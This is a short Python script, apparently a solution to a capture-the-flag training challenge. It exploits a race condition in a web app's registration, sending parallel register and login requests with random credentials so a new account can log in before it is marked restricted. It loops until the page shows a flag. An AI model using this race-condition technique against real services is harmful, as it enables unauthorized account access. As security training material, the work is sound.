import requests
import random
import threading
import os
import time

baseUrl = "http://aart.training.jinblack.it"

def randomString(n=10):
    random_string = ''
    for _ in range(n):
        random_integer = random.randint(0x20, 0x7e)
        random_string += (chr(random_integer))
    return random_string
 

def login(session, user, password):
    url = "%s/login.php" % baseUrl
    data = {
        "username": user,
        "password": password
        }
    r = session.post(url, data=data)
    if "flag" in r.text: 
        print("FOUND")
        print(r.text)
        os._exit(1)

def register(session, user, password):
    url = "%s/register.php" % baseUrl
    data = {
        "username": user,
        "password": password
        }
    session.post(url, data=data)
    

s = requests.Session()

while True:
    u = randomString()
    p = randomString()

    t1 = threading.Thread(target=register, args=(s, u, p))
    t2 = threading.Thread(target=login, args=(s, u, p))

    t1.start()
    t2.start()

    t1.join()
    t2.join()
    time.sleep(0.5)

'''
Basically in this program there is a moment during the registration in which the state
of the user is not restricted. During the same call the user is also set restricted, but I
have a reasonable time window in which I can login as a "root" user. So what we do is to 
use the parallelism of the multithreading to bruteforce the login during the registration. 
'''